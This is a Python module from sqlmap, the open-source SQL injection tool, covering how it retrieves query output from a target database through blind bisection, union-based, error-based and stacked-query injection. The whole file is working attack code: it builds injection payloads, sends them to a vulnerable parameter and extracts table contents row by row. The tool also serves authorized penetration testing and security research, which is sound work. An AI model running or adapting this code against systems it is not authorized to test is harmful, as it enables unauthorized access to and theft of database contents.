#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import expandAsteriskForColumns
from lib.core.common import parseUnionPage
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import readInput
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.request.direct import direct
from lib.techniques.inband.union.use import unionUse
from lib.techniques.blind.inference import bisection
from lib.techniques.error.use import errorUse
from lib.utils.resume import queryOutputLength
from lib.utils.resume import resume

def __goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None):
    start = time.time()

    if ( conf.eta or conf.threads > 1 ) and kb.dbms:
        _, length, _ = queryOutputLength(expression, payload)
    else:
        length = None

    dataToSessionFile("[%s][%s][%s][%s][" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], expression))

    count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar)

    debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    return value

def __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected=None, num=None, resumeValue=True, charsetType=None, firstChar=None, lastChar=None):
    outputs     = []
    origExpr    = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr   = expression
            expression = agent.limitQuery(num, expression, field)

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        if resumeValue:
            output = resume(expressionReplaced, payload)

        if not output or ( expected == "int" and not output.isdigit() ):
            if output:
                warnMsg  = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __goInference(payload, expressionReplaced, charsetType, firstChar, lastChar)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def __goInferenceProxy(expression, fromUser=False, expected=None, batch=False, resumeValue=True, unpack=True, charsetType=None, firstChar=None, lastChar=None):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    query          = agent.prefixQuery(queries[kb.misc.testedDbms].inference.query)
    query          = agent.postfixQuery(query)
    payload        = agent.payload(newValue=query)
    count          = None
    startLimit     = 0
    stopLimit      = None
    outputs        = []
    test           = None
    untilLimitChar = None
    untilOrderChar = None

    if resumeValue:
        output = resume(expression, payload)
    else:
        output = None

    if output and ( expected is None or ( expected == "int" and output.isdigit() ) ):
        return output

    if not unpack:
        return __goInference(payload, expression, charsetType, firstChar, lastChar)

    if kb.dbmsDetected:
        _, _, _, _, _, expressionFieldsList, expressionFields = agent.getFields(expression)

        rdbRegExp = re.search("RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
        if rdbRegExp and kb.dbms == "Firebird":
            expressionFieldsList = [expressionFields]

        if len(expressionFieldsList) > 1:
            infoMsg  = "the SQL query provided has more than a field. "
            infoMsg += "sqlmap will now unpack it into distinct queries "
            infoMsg += "to be able to retrieve the output even if we "
            infoMsg += "are going blind"
            logger.info(infoMsg)

        # If we have been here from SQL query/shell we have to check if
        # the SQL query might return multiple entries and in such case
        # forge the SQL limiting the query output one entry per time
        # NOTE: I assume that only queries that get data from a table
        # can return multiple entries
        if fromUser and " FROM " in expression:
            limitRegExp = re.search(queries[kb.dbms].limitregexp.query, expression, re.I)
            topLimit    = re.search("TOP\s+([\d]+)\s+", expression, re.I)

            if limitRegExp or ( kb.dbms == "Microsoft SQL Server" and topLimit ):
                if kb.dbms in ( "MySQL", "PostgreSQL" ):
                    limitGroupStart = queries[kb.dbms].limitgroupstart.query
                    limitGroupStop  = queries[kb.dbms].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif kb.dbms == "Microsoft SQL Server":
                    if limitRegExp:
                        limitGroupStart = queries[kb.dbms].limitgroupstart.query
                        limitGroupStop  = queries[kb.dbms].limitgroupstop.query

                        if limitGroupStart.isdigit():
                            startLimit = int(limitRegExp.group(int(limitGroupStart)))

                        stopLimit = limitRegExp.group(int(limitGroupStop))
                        limitCond = int(stopLimit) > 1
                    elif topLimit:
                        startLimit = 0
                        stopLimit  = int(topLimit.group(1))
                        limitCond  = int(stopLimit) > 1

                elif kb.dbms == "Oracle":
                    limitCond = False
            else:
                limitCond = True

            # I assume that only queries NOT containing a "LIMIT #, 1"
            # (or similar depending on the back-end DBMS) can return
            # multiple entries
            if limitCond:
                if limitRegExp:
                    stopLimit = int(stopLimit)

                    # From now on we need only the expression until the " LIMIT "
                    # (or similar, depending on the back-end DBMS) word
                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        stopLimit += startLimit
                        untilLimitChar = expression.index(queries[kb.dbms].limitstring.query)
                        expression = expression[:untilLimitChar]

                    elif kb.dbms == "Microsoft SQL Server":
                        stopLimit += startLimit

                if not stopLimit or stopLimit <= 1:
                    if kb.dbms == "Oracle" and expression.endswith("FROM DUAL"):
                        test = "n"
                    elif batch:
                        test = "y"
                    else:
                        message  = "can the SQL query provided return "
                        message += "multiple entries? [Y/n] "
                        test = readInput(message, default="Y")

                if not test or test[0] in ("y", "Y"):
                    # Count the number of SQL query entries output
                    countFirstField   = queries[kb.dbms].count.query % expressionFieldsList[0]
                    countedExpression = expression.replace(expressionFields, countFirstField, 1)

                    if re.search(" ORDER BY ", expression, re.I):
                        untilOrderChar = countedExpression.index(" ORDER BY ")
                        countedExpression = countedExpression[:untilOrderChar]

                    if resumeValue:
                        count = resume(countedExpression, payload)

                    if not stopLimit:
                        if not count or not count.isdigit():
                            count = __goInference(payload, countedExpression, charsetType, firstChar, lastChar)

                        if count and count.isdigit() and int(count) > 0:
                            count = int(count)

                            if batch:
                                stopLimit = count
                            else:
                                message  = "the SQL query provided can return "
                                message += "up to %d entries. How many " % count
                                message += "entries do you want to retrieve?\n"
                                message += "[a] All (default)\n[#] Specific number\n"
                                message += "[q] Quit"
                                test = readInput(message, default="a")

                                if not test or test[0] in ("a", "A"):
                                    stopLimit = count

                                elif test[0] in ("q", "Q"):
                                    return "Quit"

                                elif test.isdigit() and int(test) > 0 and int(test) <= count:
                                    stopLimit = int(test)

                                    infoMsg  = "sqlmap is now going to retrieve the "
                                    infoMsg += "first %d query output entries" % stopLimit
                                    logger.info(infoMsg)

                                elif test[0] in ("#", "s", "S"):
                                    message = "How many? "
                                    stopLimit = readInput(message, default="10")

                                    if not stopLimit.isdigit():
                                        errMsg = "Invalid choice"
                                        logger.error(errMsg)

                                        return None

                                    else:
                                        stopLimit = int(stopLimit)

                                else:
                                    errMsg = "Invalid choice"
                                    logger.error(errMsg)

                                    return None

                        elif count and not count.isdigit():
                            warnMsg  = "it was not possible to count the number "
                            warnMsg += "of entries for the SQL query provided. "
                            warnMsg += "sqlmap will assume that it returns only "
                            warnMsg += "one entry"
                            logger.warn(warnMsg)

                            stopLimit = 1

                        elif ( not count or int(count) == 0 ):
                            warnMsg  = "the SQL query provided does not "
                            warnMsg += "return any output"
                            logger.warn(warnMsg)

                            return None

                    elif ( not count or int(count) == 0 ) and ( not stopLimit or stopLimit == 0 ):
                        warnMsg  = "the SQL query provided does not "
                        warnMsg += "return any output"
                        logger.warn(warnMsg)

                        return None

                    for num in xrange(startLimit, stopLimit):
                        output = __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected, num, resumeValue=resumeValue, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar)
                        outputs.append(output)

                    return outputs

        elif kb.dbms == "Oracle" and expression.startswith("SELECT ") and " FROM " not in expression:
            expression = "%s FROM DUAL" % expression

        outputs = __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected, resumeValue=resumeValue, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar)

        returnValue = ", ".join([output for output in outputs])

    else:
        returnValue = __goInference(payload, expression, charsetType, firstChar, lastChar)

    return returnValue

def __goInband(expression, expected=None, sort=True, resumeValue=True, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an inband SQL
    injection vulnerability on the affected parameter.
    """

    output  = None
    partial = False
    data    = []

    condition = (
                  kb.resumedQueries and conf.url in kb.resumedQueries.keys()
                  and expression in kb.resumedQueries[conf.url].keys()
                )

    if condition and resumeValue:
        output = resume(expression, None)

        if not output or ( expected == "int" and not output.isdigit() ):
            partial = True

    if not output:
        output = unionUse(expression, resetCounter=True, unpack=unpack, dump=dump)

    if output:
        data = parseUnionPage(output, expression, partial, condition, sort)

    return data

def getValue(expression, blind=True, inband=True, error=True, fromUser=False, expected=None, batch=False, unpack=True, sort=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=False):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter. It can call a function to retrieve the output
    through inband SQL injection (if selected) and/or blind SQL injection
    (if selected).
    """

    if suppressOutput:
        pushValue(conf.verbose)
        conf.verbose = 0

    if conf.direct:
        value = direct(expression)
    else:
        expression = cleanQuery(expression)
        expression = expandAsteriskForColumns(expression)
        value      = None

        expression = expression.replace("DISTINCT ", "")

        if error and conf.errorTest:
            value = errorUse(expression)

            if not value:
                warnMsg  = "for some reason(s) it was not possible to retrieve "
                warnMsg += "the query output through error SQL injection "
                warnMsg += "technique, sqlmap is going %s" % ("inband" if inband and kb.unionPosition is not None else "blind")
                logger.warn(warnMsg)

        if inband and kb.unionPosition is not None and not value:
            value = __goInband(expression, expected, sort, resumeValue, unpack, dump)

            if not value:
                warnMsg  = "for some reason(s) it was not possible to retrieve "
                warnMsg += "the query output through inband SQL injection "
                warnMsg += "technique, sqlmap is going blind"
                logger.warn(warnMsg)

        oldParamFalseCond   = kb.unionFalseCond
        oldParamNegative    = kb.unionNegative
        kb.unionFalseCond   = False
        kb.unionNegative    = False

        if blind and not value:
            value = __goInferenceProxy(expression, fromUser, expected, batch, resumeValue, unpack, charsetType, firstChar, lastChar)

        kb.unionFalseCond = oldParamFalseCond
        kb.unionNegative  = oldParamNegative

        if value and isinstance(value, basestring):
            value = value.strip()

    if suppressOutput:
        conf.verbose = popValue()

    return value

def goStacked(expression, silent=False):
    expression = cleanQuery(expression)

    if conf.direct:
        return direct(expression), None

    comment = queries[kb.dbms].comment.query
    query   = agent.prefixQuery("; %s" % expression)
    query   = agent.postfixQuery("%s;%s" % (query, comment))

    debugMsg = "query: %s" % query
    logger.debug(debugMsg)

    payload = agent.payload(newValue=query)
    page, _ = Request.queryPage(payload, content=True, silent=silent)

    return payload, page

def goError(expression, suppressOutput=False):
    #expression = cleanQuery(expression)

    if suppressOutput:
        pushValue(conf.verbose)
        conf.verbose = 0

    if conf.direct:
        return direct(expression), None

    result = errorUse(expression)

    if suppressOutput:
        conf.verbose = popValue()

    return result
